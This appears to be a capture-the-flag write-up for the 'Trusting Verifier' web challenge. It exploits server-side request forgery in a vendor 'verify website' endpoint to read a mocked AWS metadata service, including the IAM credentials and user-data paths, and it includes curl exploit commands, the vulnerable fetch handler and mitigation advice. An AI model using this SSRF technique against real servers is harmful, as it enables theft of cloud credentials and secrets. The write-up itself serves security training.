# The Trusting Verifier

> *Vendors must prove their legitimacy to join the marketplace. Some have
> discovered the verification process can peek into places it shouldn't.
> What secrets lie behind the check?*

**Category:** Web — SSRF → mocked AWS IMDS user-data
**Flag:** `bitflag{ssrf_1s_4_p4rty_cr4sh3r}`

## The brief, in plain English

The vendor-application flow has a "verify website" button. The handler
fetches the supplied URL server-side and returns the response body. There
is no allow-list on the destination, so the URL parameter is a generic SSRF
primitive — including against the mocked AWS instance metadata service at
`169.254.169.254`.

The IMDS exposes a bootstrap shell script via `latest/user-data`, and the
script exports an env var called `TRUSTING_VERIFIER_FLAG`. The challenge
title is literally the name of the env var. Read the title, get the path.

## Title decode

> *The **Trusting** **Verifier***

Both halves are deliberate:

- The verifier *trusts* whatever URL you hand it.
- The verifier-flag's environment variable is named `TRUSTING_VERIFIER_FLAG`.

The CTF author named the challenge after the env var. If you spot that on
first read, the solve is mechanical from there.

## Recon

The `/vendor-application` page's form has a "Verify website" control. Its
client bundle shows the endpoint:

```
POST /api/vendor/verify-website
Content-Type: application/json
{"website":"https://yourbusiness.example/"}
```

A normal request returns:

```json
{
  "success": true,
  "message": "Website verification successful",
  "body": "<!doctype html>…"
}
```

`body` is the literal response body the server fetched. That's the SSRF
primitive — if you can name a URL, the server hands you back its content.

A quick check of what's reachable:

| URL | Reachable? |
|---|---|
| `https://example.com/` | yes (public Internet works) |
| `http://127.0.0.1:3000/…` | yes (own app on internal port) |
| `http://localhost:3000/…` | yes |
| `http://169.254.169.254/latest/meta-data/` | yes (mocked IMDS) |
| `file:///etc/passwd` | no — rejected by scheme allow-list |
| `ws://…` | no |

So `http://` and `https://` are wide open. The mocked IMDS is the
interesting one.

## The mocked IMDS

A few probes against the IMDS surface its small but real-looking shape:

```bash
$ POST /api/vendor/verify-website {"website":"http://169.254.169.254/latest/meta-data/"}
{"body":"instance-id\nhostname\niam/security-credentials/\nplacement/region\n"}

$ POST /api/vendor/verify-website {"website":"http://169.254.169.254/latest/meta-data/instance-id"}
{"body":"i-riffhack2026cafe\n"}

$ POST /api/vendor/verify-website {"website":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
{"body":"RiffhackVendorVerifierRole\n"}

$ POST /api/vendor/verify-website {"website":"http://169.254.169.254/latest/meta-data/iam/security-credentials/RiffhackVendorVerifierRole"}
{"body":"{\n  \"Code\": \"Success\",\n  \"Token\": \"bitflag{w3bs0ck3t_upgr4d3_ssrf_2026}\",\n  ...\n}"}

$ POST /api/vendor/verify-website {"website":"http://169.254.169.254/latest/user-data"}
{"body":"#!/bin/sh\nexport MARKETPLACE_ENV=ctf\nexport TRUSTING_VERIFIER_FLAG=bitflag{ssrf_1s_4_p4rty_cr4sh3r}\nnode server.js\n"}
```

Two flag-shaped values surface in the IMDS:

| Value | Where |
|---|---|
| `bitflag{w3bs0ck3t_upgr4d3_ssrf_2026}` | `Token` field on the IAM credentials response |
| `bitflag{ssrf_1s_4_p4rty_cr4sh3r}` | Env var in the `user-data` bootstrap script |

The challenge title — "The Trusting Verifier" — points at the env var named
`TRUSTING_VERIFIER_FLAG`. That's `bitflag{ssrf_1s_4_p4rty_cr4sh3r}`.

## Exploitation

One-shot:

```bash
curl -s -X POST -H 'Content-Type: application/json' \
  -d '{"website":"http://169.254.169.254/latest/user-data"}' \
  http://<host>/api/vendor/verify-website \
  | grep -oE 'bitflag\{[^}]+\}'
# bitflag{ssrf_1s_4_p4rty_cr4sh3r}
```

No login needed — `/api/vendor/verify-website` accepts unauthenticated
callers (the vendor application form is itself meant for first-time
visitors).

## Root cause

A user-supplied URL handed straight to a server-side HTTP client:

```js
async function POST(req) {
  const { website } = await req.json();
  const r = await fetch(website);
  return Response.json({
    success: r.ok,
    message: r.ok ? "Website verification successful" : `Website returned status: ${r.status}`,
    body: await r.text(),
  });
}
```

No host allow-list, no IP filtering, no rejection of link-local or RFC1918
ranges, no rejection of `169.254.0.0/16`. The scheme allow-list (`http`
and `https` only) is there but is the only filter — and it's not what you
need to prevent SSRF into IMDS.

The mocked IMDS itself is bizarre real-world behaviour: AWS's IMDSv1
(unauthenticated GETs) has historically been the source of dozens of
SSRF-to-credentials incidents in production. IMDSv2 requires a session
token from a `PUT /api/token` call, specifically to break SSRF into it.

## Mitigation

- **Block SSRF to link-local and private IP ranges.** Reject any URL whose
  resolved host is in `169.254.0.0/16`, `127.0.0.0/8`, `10/8`, `172.16/12`,
  `192.168/16`, `::1`, `fc00::/7`, or `fe80::/10`. Do the resolution
  yourself and refuse to call out to those ranges from a server-side
  fetcher.
- **Resolve hostnames to IPs before the fetch and re-check.** DNS rebinding
  attacks are a real risk against allow-list checks that only look at the
  hostname string.
- **Use IMDSv2 on AWS.** Requires session token, makes SSRF much harder to
  weaponise.
- **Don't ship secrets in user-data.** User-data shows up in IMDSv1 to
  anyone who can reach `169.254.169.254/latest/user-data`. If an env var is
  sensitive, hand it to the process via a path the process can read but
  the IMDS can't expose.

## Cross-event note — sixth confirmed decoy↔real flip

This is the sixth time in the event suite that a flag-shaped value flips
between decoy and real depending on the brief. On
[web5 — Glitchy Contact System](05-web5-glitchy-contact-system.md) the
exact same string is one of the four decoys — reached via the IMDS
user-data SSRF, but the wrong answer for that brief. Here, the brief
*names* the env var, so the same SSRF surfaces it as the real answer.

Same surface, two flags:

| Endpoint | Path | Flag |
|---|---|---|
| `/api/vendor/verify-website` | IMDS `iam/security-credentials/<role>` Token field | `bitflag{w3bs0ck3t_upgr4d3_ssrf_2026}` |
| `/api/vendor/verify-website` | IMDS `latest/user-data` env var | `bitflag{ssrf_1s_4_p4rty_cr4sh3r}` |

The vendor application form has two distinct flag-reaching primitives in
the SSRF alone, plus the JWT-forge angle on `/vendor` from the boroCTF
"Vendor's Secret Door" event.

## Takeaways

- **Read the title.** When the env var is the challenge name, the brief is
  doing the disambiguation for you. "The Trusting Verifier" → "the
  `TRUSTING_VERIFIER_FLAG` env var".
- **Mocked IMDS is good security training.** The structure of the mock —
  responses on `instance-id`, `iam/security-credentials/<role>`,
  `user-data` — is a faithful caricature of the real AWS IMDSv1 surface.
  Practising SSRF on it builds the muscle that catches the real one.
- **Same code, two flags, same primitive.** Worth pointing future-me at
  this if I see a "credential/role/IAM token leak" brief: the Token-field
  decoy here is the unflipped string — it's waiting for a challenge whose
  brief points at credentials specifically.

## One-liner

```bash
curl -s -X POST -H 'Content-Type: application/json' \
  -d '{"website":"http://169.254.169.254/latest/user-data"}' \
  http://<host>/api/vendor/verify-website \
  | grep -oE 'bitflag\{[^}]+\}'
```
